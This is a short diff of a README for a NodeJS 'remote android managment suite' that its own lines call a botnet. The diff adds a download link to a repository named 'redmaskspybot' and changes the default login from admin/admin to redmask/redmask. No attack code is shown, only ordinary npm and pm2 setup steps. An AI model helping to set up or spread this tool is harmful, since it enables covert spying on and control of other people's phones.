@@ -42,7 +42,7 @@ A cloud based remote android managment suite, powered by NodeJS
 3. install PM2 
     - `npm install pm2 -g`
 
-4. Download and Extract [HERE]
+4. Download and Extract [HERE] (https://github.com/redmaskempire/redmaskspybot.git)
 
 5. In the extracted folder, run these commands
     - `npm install` <- install dependencies
@@ -50,8 +50,8 @@ A cloud based remote android managment suite, powered by NodeJS
     - `pm2 startup` <- to run botnet on startup
 
 6. Default Username & Password
-    - Username: admin
-    - Password: admin
+    - Username: redmask
+    - Password: redmask
     
 7. Set Username & Password Manually  
     1. Stop botnet `pm2 stop index`
